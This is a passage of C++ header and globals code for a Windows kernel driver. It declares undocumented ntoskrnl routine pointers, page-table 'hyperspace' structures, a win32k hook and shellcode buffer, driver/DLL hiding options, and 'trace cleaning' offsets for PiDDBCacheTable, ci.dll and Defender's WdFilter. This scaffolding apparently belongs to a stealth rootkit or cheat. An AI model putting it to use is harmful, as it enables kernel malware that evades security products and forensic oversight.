  SystemFlagsInformation,
  SystemCallTimeInformation,
  SystemModuleInformation,
  SystemLocksInformation,
  SystemStackTraceInformation,
  SystemPagedPoolInformation,
  SystemNonPagedPoolInformation,
  SystemHandleInformation,
  SystemObjectInformation,
  SystemPageFileInformation,
  SystemVdmInstemulInformation,
  SystemVdmBopInformation,
  SystemFileCacheInformation,
  SystemPoolTagInformation,
  SystemInterruptInformation,
  SystemDpcBehaviorInformation,
  SystemFullMemoryInformation,
  SystemLoadGdiDriverInformation,
  SystemUnloadGdiDriverInformation,
  SystemTimeAdjustmentInformation,
  SystemSummaryMemoryInformation,
  SystemNextEventIdInformation,
  SystemEventIdsInformation,
  SystemCrashDumpInformation,
  SystemExceptionInformation,
  SystemCrashDumpStateInformation,
  SystemKernelDebuggerInformation,
  SystemContextSwitchInformation,
  SystemRegistryQuotaInformation,
  SystemExtendServiceTableInformation,
  SystemPrioritySeperation,
  SystemPlugPlayBusInformation,
  SystemDockInformation,
  SystemProcessorSpeedInformation,
  SystemCurrentTimeZoneInformation,
  SystemLookasideInformation
} SYSTEM_INFORMATION_CLASS, *PSYSTEM_INFORMATION_CLASS;

typedef struct _PAGE_INFORMATION {
  PML4E_64* PML4E;
  PDPTE_64* PDPTE;
  PDE_64* PDE;
  PTE_64* PTE;
} PAGE_INFORMATION, *PPAGE_INFORMATION;

// 0x1 bytes (sizeof)
struct _MMPFNENTRY1 {
  UCHAR PageLocation : 3;     // 0x0
  UCHAR WriteInProgress : 1;  // 0x0
  UCHAR Modified : 1;         // 0x0
  UCHAR ReadInProgress : 1;   // 0x0
  UCHAR CacheAttribute : 2;   // 0x0
};

// 0x8 bytes (sizeof)
struct _MIPFNBLINK {
  union {
    struct {
      ULONGLONG Blink : 40;                   // 0x0
      ULONGLONG NodeBlinkLow : 19;            // 0x0
      ULONGLONG TbFlushStamp : 3;             // 0x0
      ULONGLONG PageBlinkDeleteBit : 1;       // 0x0
      ULONGLONG PageBlinkLockBit : 1;         // 0x0
      ULONGLONG ShareCount : 62;              // 0x0
      ULONGLONG PageShareCountDeleteBit : 1;  // 0x0
      ULONGLONG PageShareCountLockBit : 1;    // 0x0
    };
    LONGLONG EntireField;  // 0x0
    struct {
      ULONGLONG LockNotUsed : 62;  // 0x0
      ULONGLONG DeleteBit : 1;     // 0x0
      ULONGLONG LockBit : 1;       // 0x0
    };
  };
};

struct _MI_ACTIVE_PFN {
  union {
    struct {
      ULONGLONG Tradable : 1;        // 0x0
      ULONGLONG NonPagedBuddy : 43;  // 0x0
    } Leaf;                          // 0x0
    struct {
      ULONGLONG Tradable : 1;                // 0x0
      ULONGLONG WsleAge : 3;                 // 0x0
      ULONGLONG OldestWsleLeafEntries : 10;  // 0x0
      ULONGLONG OldestWsleLeafAge : 3;       // 0x0
      ULONGLONG NonPagedBuddy : 43;          // 0x0
    } PageTable;                             // 0x0
    ULONGLONG EntireActiveField;             // 0x0
  };
};

struct _MMPFNENTRY3 {
  UCHAR Priority : 3;
  UCHAR OnProtectedStandby : 1;
  UCHAR InPageError : 1;
  UCHAR SystemChargedPage : 1;
  UCHAR RemovalRequested : 1;
  UCHAR ParityError : 1;
};

struct _MI_PFN_FLAGS {
  union {
    struct {
      USHORT ReferenceCount;
      UCHAR PageLocation : 3;
      UCHAR WriteInProgress : 1;
      UCHAR Modified : 1;
      UCHAR ReadInProgress : 1;
      UCHAR CacheAttribute : 2;
      UCHAR Priority : 3;
      UCHAR OnProtectedStandby : 1;
      UCHAR InPageError : 1;
      UCHAR SystemChargedPage : 1;
      UCHAR RemovalRequested : 1;
      UCHAR ParityError : 1;
    };
    ULONG EntireField;
  };
};

struct _MI_PFN_FLAGS4 {
  union {
    struct {
      ULONGLONG PteFrame : 40;
    } Bits;
    ULONGLONG EntireField;
  };
};

typedef struct _KLDR_DATA_TABLE_ENTRY {
  LIST_ENTRY InLoadOrderLinks;
  PVOID ExceptionTable;
  ULONG ExceptionTableSize;
  PVOID GpValue;
  PVOID NonPagedDebugInfo;
  PVOID DllBase;
  PVOID EntryPoint;
  ULONG SizeOfImage;
  UNICODE_STRING FullDllName;
  UNICODE_STRING BaseDllName;
  ULONG Flags;
  USHORT LoadCount;
  USHORT __Unused5;
  PVOID SectionPointer;
  ULONG CheckSum;
  PVOID LoadedImports;
  PVOID PatchInformation;
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;

// hyperspace context structure
struct hyperspace_ctx {
  PEPROCESS orig_peproc;
  uintptr_t clone_peproc_page_base;
  PEPROCESS clone_peproc;
  uintptr_t hyperspace_pml4_va;
  uintptr_t hyperspace_pml4_pa;
  uintptr_t orig_pml4_pa;  // Removed orig_pml4_va since we're using physical
  // operations
  bool initialized;

  // self-reference entry tracking
  bool has_self_reference_entry;
  uint32_t self_reference_entry_index;

  // target pid for callback filtering
  uint32_t target_pid;
};

struct ntoskrnl_mapping_info {
  uintptr_t original_base;
  uintptr_t original_size;
  uintptr_t hyperspace_base;
  uint32_t pml4_index;
  uint32_t pdpt_index;
  uint32_t pd_index;
  uintptr_t new_pdpt_pa;
  uintptr_t new_pd_pa;
  uintptr_t new_pt_pa;         // only used if not large page
  uintptr_t* allocated_pages;  // track all allocated physical pages
  volatile long allocated_pages_count;
  size_t allocated_pages_capacity;
};

struct self_reference_entry_info {
  uint32_t index;
  bool found;
  PML4E_64 original_entry;
};
namespace function_types {
  // memory management
  using mm_allocate_independent_pages_ex_t = void*(__fastcall*)(size_t bytes, int node,
                                                                std::uint64_t* a3, unsigned int a4);
  using mm_set_page_protection_t = char(__fastcall*)(uint64_t address, uint32_t size,
                                                     unsigned long new_protect);
  using mm_free_independent_pages = __int64(__fastcall*)(unsigned __int64 address,
                                                         unsigned __int64 bytes);
  using mm_allocate_contiguous_memory_t =
      PVOID(__stdcall*)(SIZE_T number_of_bytes, PHYSICAL_ADDRESS HighestAcceptableAddress);
  using mm_free_contiguous_memory_t = void(__stdcall*)(void* base_address);
  using mm_copy_memory_t = NTSTATUS(__stdcall*)(PVOID destination_address,
                                                MM_COPY_ADDRESS source_address,
                                                SIZE_T number_of_bytes, ULONG flags,
                                                PSIZE_T number_of_bytes_transferred);
  using mm_get_virtual_for_physical_t = PVOID(__stdcall*)(PHYSICAL_ADDRESS physical_address);
  using mm_copy_virtual_memory_t = NTSTATUS(__stdcall*)(
      PEPROCESS source_process, PVOID source_address, PEPROCESS target_process,
      PVOID target_address, SIZE_T buffer_size, KPROCESSOR_MODE previous_mode, PSIZE_T return_size);
  using mm_mark_physical_memory_as_bad_t = NTSTATUS(__stdcall*)(PPHYSICAL_ADDRESS start_address,
                                                                PLARGE_INTEGER number_of_bytes);
  using mm_user_probe_address_t = PVOID*;
  using mm_get_system_routine_address_t = PVOID(__stdcall*)(PUNICODE_STRING system_routine_name);
  using mm_get_physical_address_t = PHYSICAL_ADDRESS(__stdcall*)(PVOID base_address);
  using mm_get_physical_memory_ranges_t = PPHYSICAL_MEMORY_RANGE(__stdcall*)();
  using mm_is_address_valid_t = BOOLEAN(__stdcall*)(PVOID virtual_address);
  using mm_allocate_secure_kernel_pages_t = ULONG*(__fastcall*)(ULONG** BugCheckParameter2,
                                                                __int64 a2, int a3, __int64 a4,
                                                                DWORD* a5);

  // memory info (MI) functions
  using mi_get_vm_access_logging_partition_t = __int64 (*)(VOID);
  using mi_create_decay_pfn_t = _SLIST_ENTRY* (*)();
  using mi_get_ultra_page_t = __int64 (*)(__int64 a1, char a2);
  using mi_reserve_ptes_t = void* (*)(std::uintptr_t mi_system_pte_info,
                                      std::uintptr_t number_of_ptes);
  using mi_get_pte_address_t = void* (*)(std::uintptr_t va);
  using mi_get_pde_address_t = void* (*)(std::uintptr_t va);
  using mi_remove_physical_memory_t = NTSTATUS(__stdcall*)(std::uintptr_t physical_page,
                                                           std::uintptr_t number_of_pages,
                                                           unsigned long flags);
  using mi_flush_cache_range_t = __int64(__fastcall*)(std::uintptr_t physical_page,
                                                      std::uintptr_t number_of_pages);
  using mi_flush_entire_tb_due_to_attribute_change_t = __int64(__fastcall*)();
  using mi_get_page_table_pfn_buddy_raw_t = PEPROCESS(__fastcall*)(void* pfn_entry);
  using mi_set_page_table_pfn_buddy_t = __int64(__fastcall*)(__int64 pfn_entry,
                                                             unsigned __int64 eprocess_maybe,
                                                             char unk3);

  using mi_lock_page_table_page_t = __int64(__fastcall*)(__int64 pfn_entry, int a2);
  using mi_allocate_large_zero_pages_t = __int64(__fastcall*)(unsigned int* a1);

  // proc/obj management
  using ps_acquire_process_exit_synchronization_t = NTSTATUS(__stdcall*)(PEPROCESS process);
  using ps_release_process_exit_synchronization_t = void(__stdcall*)(PEPROCESS process);
  using ps_get_process_exit_status_t = NTSTATUS(__stdcall*)(PEPROCESS process);
  using ps_set_create_thread_notify_routine_t =
      NTSTATUS(__stdcall*)(PCREATE_THREAD_NOTIFY_ROUTINE notify_routine);
  using ps_set_create_process_notify_routine_ex_t =
      NTSTATUS(__stdcall*)(PCREATE_PROCESS_NOTIFY_ROUTINE_EX notify_routine, BOOLEAN Remove);
  using ps_lookup_process_by_process_id_t = NTSTATUS(__stdcall*)(HANDLE process_id,
                                                                 PEPROCESS* process);
  using ps_lookup_thread_by_thread_id_t = NTSTATUS(__stdcall*)(HANDLE thread_id, PETHREAD* thread);
  using ps_get_next_process_thread_t = PETHREAD(__stdcall*)(PEPROCESS process, PETHREAD thread);
  using ps_suspend_thread_t = NTSTATUS(__stdcall*)(PETHREAD thread, PULONG previous_suspend_count);
  using ps_query_thread_start_address_t = __int64(__stdcall*)(__int64 thread, int a2);
  using ps_get_current_thread_id_t = HANDLE(__stdcall*)();
  using ps_get_process_peb_t = PPEB(__fastcall*)(PEPROCESS process);
  using ps_get_process_image_file_name_t = PCHAR(__fastcall*)(PEPROCESS process);
  using io_get_current_process_t = PEPROCESS(__stdcall*)();
  using obf_dereference_object_t = LONG_PTR(__fastcall*)(PVOID object);

  // executive functions
  using ex_allocate_pool2_t = PVOID(__stdcall*)(POOL_FLAGS flags, SIZE_T number_of_bytes,
                                                ULONG tag);
  using ex_free_pool_with_tag_t = void(__stdcall*)(PVOID p, ULONG tag);
  using ex_get_previous_mode_t = KPROCESSOR_MODE(__stdcall*)();

  // runtime library
  using rtl_init_ansi_string_t = void(__stdcall*)(PANSI_STRING destination_string,
                                                  PCSZ source_string);
  using rtl_init_unicode_string_t = void(__stdcall*)(PUNICODE_STRING destination_string,
                                                     PCWSTR source_string);
  using rtl_ansi_string_to_unicode_string_t =
      NTSTATUS(__stdcall*)(PUNICODE_STRING destination_string, PCANSI_STRING source_string,
                           BOOLEAN allocate_destination_string);
  using rtl_compare_unicode_string_t = LONG(__stdcall*)(PCUNICODE_STRING string1,
                                                        PCUNICODE_STRING string2,
                                                        BOOLEAN case_in_sensitive);
  using rtl_free_unicode_string_t = void(__stdcall*)(PUNICODE_STRING unicode_string);
  using rtl_get_version_t = NTSTATUS(__stdcall*)(PRTL_OSVERSIONINFOW version_information);
  using rtl_create_user_thread_t = NTSTATUS (*)(HANDLE process_handle,
                                                PSECURITY_DESCRIPTOR security_descriptor,
                                                BOOLEAN create_suspended, ULONG stack_zero_bits,
                                                PULONG stack_reserved, PULONG stack_commit,
                                                PVOID start_address, PVOID start_parameter,
                                                PHANDLE thread_handle, PCLIENT_ID client_id);

  // zw/nt functions
  using zw_open_process_t = NTSTATUS(__stdcall*)(PHANDLE process_handle, ACCESS_MASK desired_access,
                                                 POBJECT_ATTRIBUTES object_attributes,
                                                 PCLIENT_ID client_id);

  using zw_close_t = NTSTATUS(__stdcall*)(HANDLE handle);

  using zw_wait_for_single_object_t = NTSTATUS(__stdcall*)(HANDLE handle, BOOLEAN alertable,
                                                           PLARGE_INTEGER timeout);

  using zw_query_information_process_t = NTSTATUS(__fastcall*)(
      _In_ HANDLE ProcessHandle, _In_ PROCESSINFOCLASS ProcessInformationClass,
      _Out_ PVOID ProcessInformation, _In_ ULONG ProcessInformationLength,
      _Out_opt_ PULONG ReturnLength);

  using nt_alert_resume_thread_t = NTSTATUS(__fastcall*)(HANDLE thread_handle,
                                                         PULONG suspend_count);

  // debug
  using dbg_print_t = ULONG(__cdecl*)(PCCH format, ...);

  // crt functions
  using memcpy_t = void*(__cdecl*)(void* dest, const void* src, size_t count);
  using memset_t = void*(__cdecl*)(void* dest, int c, size_t count);
  using memcmp_t = int(__cdecl*)(const void* buf1, const void* buf2, size_t count);
  using strncmp_t = int(__cdecl*)(const char* str1, const char* str2, size_t count);
  using strlen_t = size_t(__cdecl*)(const char* str);
  using _wcsicmp_t = int(__cdecl*)(const wchar_t* str1, const wchar_t* str2);
  using rand_t = int(__cdecl*)();
  using srand_t = void(__cdecl*)(unsigned int seed);
  using swprintf_s_t = int(__cdecl*)(wchar_t* Dst, size_t SizeInWords, const wchar_t* Format, ...);
  using snprintf_t = int(__cdecl*)(char* Dest, size_t Count, const char* Format, ...);

  // existing types
  using ke_flush_single_tb_t = __int64(__fastcall*)(uintptr_t address, unsigned int a2,
                                                    unsigned int a3);
  using ke_flush_entire_tb_t = VOID (*)(BOOLEAN invalid, BOOLEAN all_processors);
  using ke_invalidate_all_caches_t = VOID (*)(VOID);
  using ke_delay_execution_thread_t = NTSTATUS (*)(KPROCESSOR_MODE WaitMode, BOOLEAN Alertable,
                                                   PLARGE_INTEGER Interval);

  using ke_raise_irql_to_dpc_level_t = KIRQL(__stdcall*)(VOID);
  using ke_lower_irql_t = VOID(__stdcall*)(KIRQL new_irql);
  using ke_query_system_time_precise_t = VOID(__fastcall*)(PLARGE_INTEGER current_time);
  using ke_initialize_apc_t = VOID(__fastcall*)(PKAPC Apc, PKTHREAD Thread,
                                                KAPC_ENVIRONMENT Environment,
                                                PKKERNEL_ROUTINE KernelRoutine,
                                                PKRUNDOWN_ROUTINE RundownRoutine,
                                                PKNORMAL_ROUTINE NormalRoutine,
                                                KPROCESSOR_MODE ProcessorMode, PVOID NormalContext);

  using ke_insert_queue_apc_t = BOOLEAN(__fastcall*)(PRKAPC Apc, PVOID SystemArgument1,
                                                     PVOID SystemArgument2, KPRIORITY Increment);

  using ke_usermode_callback_t = __int64(__fastcall*)(IN int a1, IN void* a2, IN unsigned int a3,
                                                      OUT PVOID* out, OUT PULONG64 out_len);

  using ke_alert_thread_t = BOOLEAN(__fastcall*)(__inout PKTHREAD Thread,
                                                 __in KPROCESSOR_MODE ProcessorMode);

}  // namespace function_types

struct pdb_offsets {
  // driver vars
  uintptr_t NtoskrnlBase;
  uintptr_t DriverAllocBase;
  uintptr_t DriverSize;
  uint32_t DriverHideType;
  uint32_t DllHideType;
  uint32_t ExperimentalOptions;

  // memory management (Mm) functions
  uintptr_t MmGetPhysicalAddress;
  uintptr_t MmPfnDatabase;
  uintptr_t MmAllocateIndependentPages;
  uintptr_t MmSetPageProtection;
  uintptr_t MmFreeIndependentPages;
  uintptr_t MmAllocateContiguousMemory;
  uintptr_t MmFreeContiguousMemory;
  uintptr_t MmCopyMemory;
  uintptr_t MmGetVirtualForPhysical;
  uintptr_t MmCopyVirtualMemory;
  uintptr_t MmMarkPhysicalMemoryAsBad;
  uintptr_t MmUserProbeAddress;
  uintptr_t MmGetSystemRoutineAddress;
  uintptr_t MmGetPhysicalMemoryRanges;
  uintptr_t MmIsAddressValid;
  uintptr_t MmAllocateSecureKernelPages;
  uintptr_t MmPhysicalMemoryBlock;

  // memory info (Mi) functions
  uintptr_t MiGetVmAccessLoggingPartition;
  uintptr_t MiCreateDecayPfn;
  uintptr_t MiGetUltraPage;
  uintptr_t MiReservePtes;
  uintptr_t MiGetPteAddress;
  uintptr_t MiGetPdeAddress;
  uintptr_t MiSystemPartition;
  uintptr_t MiInitializePfn;
  uintptr_t MiGetPage;
  uintptr_t MiWaitForFreePage;
  uintptr_t MiRemovePhysicalMemory;
  uintptr_t MiFlushEntireTbDueToAttributeChange;
  uintptr_t MiFlushCacheRange;
  uintptr_t MiPinDriverAddressLog;
  uintptr_t MiGetPageTablePfnBuddyRaw;
  uintptr_t MiSetPageTablePfnBuddy;
  uintptr_t MiLockPageTablePage;
  uintptr_t MiAllocateLargeZeroPages;

  // proc/obj management functions
  uintptr_t PsLoadedModuleList;
  uintptr_t PsAcquireProcessExitSynchronization;
  uintptr_t PsReleaseProcessExitSynchronization;
  uintptr_t PsGetProcessExitStatus;
  uintptr_t PsSetCreateThreadNotifyRoutine;
  uintptr_t PsSetCreateProcessNotifyRoutineEx;
  uintptr_t PsLookupProcessByProcessId;
  uintptr_t PsLookupThreadByThreadId;
  uintptr_t PsGetNextProcessThread;
  uintptr_t PsSuspendThread;
  uintptr_t PsResumeThread;
  uintptr_t PsQueryThreadStartAddress;
  uintptr_t PsGetCurrentThreadId;
  uintptr_t PsGetProcessPeb;
  uintptr_t PsGetProcessImageFileName;
  uintptr_t IoGetCurrentProcess;
  uintptr_t ObfDereferenceObject;

  // processor support functions
  uintptr_t PspExitThread;

  // executive functions
  uintptr_t ExAllocatePool2;
  uintptr_t ExFreePoolWithTag;
  uintptr_t ExGetPreviousMode;

  // kernel exec functions
  uintptr_t KeBalanceSetManager;
  uintptr_t KeRaiseIrqlToDpcLevel;
  uintptr_t KeLowerIrql;
  uintptr_t KiProcessListHead;
  uintptr_t KiPageFault;
  uintptr_t KeFlushSingleTb;
  uintptr_t KeQuerySystemTimePrecise;
  uintptr_t KiKvaShadow;
  uintptr_t KeInitializeApc;
  uintptr_t KeInsertQueueApc;
  uintptr_t KeUsermodeCallback;
  uintptr_t KeAlertThread;
  uintptr_t KeDelayExecutionThread;

  // runtime library functions
  uintptr_t RtlInitAnsiString;
  uintptr_t RtlInitUnicodeString;
  uintptr_t RtlAnsiStringToUnicodeString;
  uintptr_t RtlCompareUnicodeString;
  uintptr_t RtlFreeUnicodeString;
  uintptr_t RtlGetVersion;
  uintptr_t RtlCreateUserThread;

  // Zw/Nt functions
  uintptr_t ZwOpenProcess;
  uintptr_t ZwClose;
  uintptr_t ZwWaitForSingleObject;
  uintptr_t ZwQueryInformationProcess;
  uintptr_t NtAlertResumeThread;

  // debug functions
  uintptr_t DbgPrint;

  // crt functions
  uintptr_t memcpy;
  uintptr_t memset;
  uintptr_t memcmp;
  uintptr_t strncmp;
  uintptr_t strlen;
  uintptr_t _wcsicmp;
  uintptr_t rand;
  uintptr_t srand;
  uintptr_t swprintf_s;
  uintptr_t snprintf;

  // offsets

  uintptr_t ActiveProcessLinks;
  uintptr_t _EPROCESS_ThreadListHead;
  uintptr_t _KPROCESS_ThreadListHead;
  uintptr_t _EPROCESS_SharedCommitLinks;
  uintptr_t _EPROCESS_SharedCommitCharge;
  uintptr_t _EPROCESS_RundownProtect;
  uintptr_t _EPROCESS_Vm;
  uintptr_t _EPROCESS_Flags3;

  // trace cleaning - ntoskrnl
  uintptr_t PiDDBCacheTable;
  uintptr_t PiDDBLock;

  // trace cleaning - ci.dll
  uintptr_t g_KernelHashBucketList;
  uintptr_t g_PEProcessHashBucketList;
  uintptr_t g_PEProcessList;
  uintptr_t g_HashCacheLock;
  uintptr_t g_CiEaCacheLookasideList;
  uintptr_t g_CiValidationLookasideList;
  uintptr_t RtlPcToFileName;

  // trace cleaning - WdFilter.sys
  uintptr_t MpBmDocOpenRules;
  uintptr_t MpFreeDriverInfoEx;
};

// #pragma function(memset)
// extern "C" {
// void* memset(void* dest, int value, size_t count) {
//   unsigned char* p = (unsigned char*)dest;
//   unsigned char val = (unsigned char)value;
//
//   for (size_t i = 0; i < count; i++) {
//     p[i] = val;
//   }
//
//   return dest;
// }
// }

```

`driver/def/globals.cpp`:

```cpp
#pragma once
#include "globals.hpp"

namespace globals {
  // func address to hook in win32k.sys
  extern uintptr_t hook_address = 0;
  extern void* shell_address = 0;
  extern int SHELL_SIZE = 12;
  extern int SHELL_SIZE_FJ = 14;
  extern uintptr_t hook_pointer = 0;
  extern uintptr_t ntos_base = 0;

  extern uint32_t driver_hide_type = 0;
  extern uint32_t dll_hide_type = 0;
  extern uint32_t experimental_options = 0;

  extern uintptr_t driver_alloc_base = 0;
  extern size_t driver_size = 0;
  extern function_types::ke_flush_single_tb_t ke_flush_single_tb = nullptr;
  extern function_types::ke_flush_entire_tb_t ke_flush_entire_tb = nullptr;
  extern function_types::ke_invalidate_all_caches_t ke_invalidate_all_caches = nullptr;
  extern function_types::mm_allocate_independent_pages_ex_t mm_allocate_independent_pages_ex =
      nullptr;
  extern function_types::mm_free_contiguous_memory_t mm_free_contiguous_memory = nullptr;
  extern function_types::mm_set_page_protection_t mm_set_page_protection = nullptr;
  extern function_types::mm_free_independent_pages mm_free_independent_pages = nullptr;

  extern function_types::mi_get_vm_access_logging_partition_t mi_get_vm_access_logging_partition =
      nullptr;
  extern function_types::mi_create_decay_pfn_t mi_create_decay_pfn = nullptr;
  extern function_types::mi_get_ultra_page_t mi_get_ultra_page = nullptr;
  extern function_types::mi_reserve_ptes_t mi_reserve_ptes = nullptr;
  extern function_types::mi_get_pte_address_t mi_get_pte_address = nullptr;
  extern function_types::mi_get_pde_address_t mi_get_pde_address = nullptr;
  extern function_types::mi_remove_physical_memory_t mi_remove_physical_memory = nullptr;
  extern function_types::mi_flush_entire_tb_due_to_attribute_change_t
      mi_flush_entire_tb_due_to_attribute_change = nullptr;
  extern function_types::mi_flush_cache_range_t mi_flush_cache_range = nullptr;
  extern function_types::mi_get_page_table_pfn_buddy_raw_t mi_get_page_table_pfn_buddy_raw =
      nullptr;
  extern function_types::mi_set_page_table_pfn_buddy_t mi_set_page_table_pfn_buddy = nullptr;
  extern function_types::mi_lock_page_table_page_t mi_lock_page_table_page = nullptr;
  extern function_types::mi_allocate_large_zero_pages_t mi_allocate_large_zero_pages = nullptr;

  extern function_types::mm_get_physical_address_t mm_get_physical_address = nullptr;
  extern function_types::mm_allocate_contiguous_memory_t mm_allocate_contiguous_memory = nullptr;
  extern function_types::mm_copy_memory_t mm_copy_memory = nullptr;
  extern function_types::mm_get_virtual_for_physical_t mm_get_virtual_for_physical = nullptr;
  extern function_types::mm_copy_virtual_memory_t mm_copy_virtual_memory = nullptr;
  extern function_types::mm_mark_physical_memory_as_bad_t mm_mark_physical_memory_as_bad = nullptr;
  extern function_types::mm_user_probe_address_t mm_user_probe_address = nullptr;
  extern function_types::mm_get_system_routine_address_t mm_get_system_routine_address = nullptr;
  extern function_types::mm_get_physical_memory_ranges_t mm_get_physical_memory_ranges = nullptr;
  extern function_types::mm_is_address_valid_t mm_is_address_valid = nullptr;
  extern function_types::mm_allocate_secure_kernel_pages_t mm_allocate_secure_kernel_pages =
      nullptr;

  extern uintptr_t mm_highest_physical_page = 0;
  extern uintptr_t mm_lowest_physical_page = 0;

  extern uintptr_t ps_loaded_module_list = 0;
  extern function_types::ps_acquire_process_exit_synchronization_t
      ps_acquire_process_exit_synchronization = nullptr;
  extern function_types::ps_release_process_exit_synchronization_t
      ps_release_process_exit_synchronization = nullptr;
  extern function_types::ps_get_process_exit_status_t ps_get_process_exit_status = nullptr;
  extern function_types::ps_set_create_thread_notify_routine_t ps_set_create_thread_notify_routine =
      nullptr;
  extern function_types::ps_set_create_process_notify_routine_ex_t
      ps_set_create_process_notify_routine_ex = nullptr;
  extern function_types::ps_lookup_process_by_process_id_t ps_lookup_process_by_process_id =
      nullptr;
  extern function_types::ps_lookup_thread_by_thread_id_t ps_lookup_thread_by_thread_id = nullptr;
  extern function_types::ps_get_next_process_thread_t ps_get_next_process_thread = nullptr;
  extern function_types::ps_suspend_thread_t ps_suspend_thread = nullptr;
  extern function_types::ps_suspend_thread_t ps_resume_thread = nullptr;
  extern function_types::ps_query_thread_start_address_t ps_query_thread_start_address = nullptr;
  extern function_types::ps_get_current_thread_id_t ps_get_current_thread_id = nullptr;
  extern function_types::ps_get_process_peb_t ps_get_process_peb = nullptr;
  extern function_types::ps_get_process_image_file_name_t ps_get_process_image_file_name = nullptr;
  extern function_types::io_get_current_process_t io_get_current_process = nullptr;
  extern function_types::obf_dereference_object_t obf_dereference_object = nullptr;

  extern uintptr_t psp_exit_thread = 0;

  extern function_types::ex_allocate_pool2_t ex_allocate_pool2 = nullptr;
  extern function_types::ex_free_pool_with_tag_t ex_free_pool_with_tag = nullptr;
  extern function_types::ex_get_previous_mode_t ex_get_previous_mode = nullptr;

  extern uintptr_t ke_balance_set_manager = 0;
  extern function_types::ke_raise_irql_to_dpc_level_t ke_raise_irql_to_dpc_level = nullptr;
  extern function_types::ke_lower_irql_t ke_lower_irql = nullptr;
  extern function_types::ke_query_system_time_precise_t ke_query_system_time_precise = nullptr;
  extern function_types::ke_initialize_apc_t ke_initialize_apc = nullptr;
  extern function_types::ke_insert_queue_apc_t ke_insert_queue_apc = nullptr;
  extern function_types::ke_usermode_callback_t ke_usermode_callback = nullptr;
  extern function_types::ke_alert_thread_t ke_alert_thread = nullptr;
  extern function_types::ke_delay_execution_thread_t ke_delay_execution_thread = nullptr;
  extern PLIST_ENTRY ki_process_list_head = 0;
  extern uintptr_t ki_page_fault = 0;
  extern uintptr_t ki_kva_shadow = 0;

  extern function_types::rtl_init_ansi_string_t rtl_init_ansi_string = nullptr;
  extern function_types::rtl_init_unicode_string_t rtl_init_unicode_string = nullptr;
  extern function_types::rtl_ansi_string_to_unicode_string_t rtl_ansi_string_to_unicode_string =
      nullptr;
  extern function_types::rtl_compare_unicode_string_t rtl_compare_unicode_string = nullptr;
  extern function_types::rtl_free_unicode_string_t rtl_free_unicode_string = nullptr;
  extern function_types::rtl_get_version_t rtl_get_version = nullptr;
  extern function_types::rtl_create_user_thread_t rtl_create_user_thread = nullptr;

  extern function_types::zw_open_process_t zw_open_process = nullptr;
  extern function_types::zw_close_t zw_close = nullptr;
  extern function_types::zw_wait_for_single_object_t zw_wait_for_single_object = nullptr;
  extern function_types::zw_query_information_process_t zw_query_information_process = nullptr;
  extern function_types::nt_alert_resume_thread_t nt_alert_resume_thread = nullptr;

  extern function_types::dbg_print_t dbg_print = nullptr;

  extern function_types::memcpy_t memcpy = nullptr;
  extern function_types::memset_t memset = nullptr;
  extern function_types::memcmp_t memcmp = nullptr;
  extern function_types::strncmp_t strncmp = nullptr;
  extern function_types::strlen_t strlen = nullptr;
  extern function_types::_wcsicmp_t _wcsicmp = nullptr;
  extern function_types::rand_t rand = nullptr;
  extern function_types::srand_t srand = nullptr;
  extern function_types::swprintf_s_t swprintf_s = nullptr;
  extern function_types::snprintf_t snprintf = nullptr;
  extern LONG some_dword = 0;
  extern uintptr_t mm_pfn_db = 0;
  extern uintptr_t mm_physical_memory_block = 0;
  extern uintptr_t mi_system_partition = 0;
  extern hyperspace_ctx ctx = {0};

  extern uintptr_t active_process_links = 0x0;
  extern uintptr_t _eprocess_thread_list_head = 0x0;
  extern uintptr_t _kprocess_thread_list_head = 0x0;
  extern uintptr_t _eprocess_shared_commit_links = 0x0;
  extern uintptr_t _eprocess_shared_commit_charge = 0x0;
  extern uintptr_t _eprocess_rundown_protect = 0x0;
  extern uintptr_t _eprocess_vm = 0x0;
  extern uintptr_t _eprocess_flags3 = 0x0;

  extern uintptr_t _kprocess_dirbase = 0x28;
  extern uintptr_t _kthread_pkprocess = 0x220;
  extern uintptr_t _kthread_apcstate_pkprocess = 0xB8;

  extern PEPROCESS proc = 0x0;
  extern unsigned long build_version = 0;
  extern bool initialized = false;
}  // namespace globals

#pragma function(memset)
void* memset(void* dest, int value, size_t count) {
  unsigned char* p = (unsigned char*)dest;
  unsigned char val = (unsigned char)value;

  for (size_t i = 0; i < count; i++) {
    p[i] = val;
  }

  return dest;
};
```

`driver/def/globals.hpp`:

```hpp
#pragma once
#include <ntdef.h>
#include <ntifs.h>
#include <ntddk.h>
#include <ntimage.h>
#include <windef.h>
#include <ntstrsafe.h>
#include <cstdint>
#include <stdlib.h>
#include "ia32.hpp"
#include "def.hpp"

namespace globals {
  // func address to hook in win32k.sys
  extern uintptr_t hook_address;
  extern void* shell_address;
  extern int SHELL_SIZE;
  extern int SHELL_SIZE_FJ;
  extern uintptr_t hook_pointer;
  extern uintptr_t ntos_base;

  extern uint32_t driver_hide_type;
  extern uint32_t dll_hide_type;
  extern uint32_t experimental_options;

  extern uintptr_t driver_alloc_base;
  extern size_t driver_size;
  extern function_types::ke_flush_single_tb_t ke_flush_single_tb;
  extern function_types::ke_flush_entire_tb_t ke_flush_entire_tb;
  extern function_types::ke_invalidate_all_caches_t ke_invalidate_all_caches;
  extern function_types::mm_allocate_independent_pages_ex_t mm_allocate_independent_pages_ex;
  extern function_types::mm_free_contiguous_memory_t mm_free_contiguous_memory;
  extern function_types::mm_set_page_protection_t mm_set_page_protection;
  extern function_types::mm_free_independent_pages mm_free_independent_pages;

  extern function_types::mi_get_vm_access_logging_partition_t mi_get_vm_access_logging_partition;
  extern function_types::mi_create_decay_pfn_t mi_create_decay_pfn;
  extern function_types::mi_get_ultra_page_t mi_get_ultra_page;
  extern function_types::mi_reserve_ptes_t mi_reserve_ptes;
  extern function_types::mi_get_pte_address_t mi_get_pte_address;
  extern function_types::mi_get_pde_address_t mi_get_pde_address;
  extern function_types::mi_remove_physical_memory_t mi_remove_physical_memory;
  extern function_types::mi_flush_entire_tb_due_to_attribute_change_t
      mi_flush_entire_tb_due_to_attribute_change;
  extern function_types::mi_flush_cache_range_t mi_flush_cache_range;
  extern function_types::mi_get_page_table_pfn_buddy_raw_t mi_get_page_table_pfn_buddy_raw;
  extern function_types::mi_set_page_table_pfn_buddy_t mi_set_page_table_pfn_buddy;
  extern function_types::mi_lock_page_table_page_t mi_lock_page_table_page;
  extern function_types::mi_allocate_large_zero_pages_t mi_allocate_large_zero_pages;

  extern function_types::mm_get_physical_address_t mm_get_physical_address;
  extern function_types::mm_allocate_contiguous_memory_t mm_allocate_contiguous_memory;
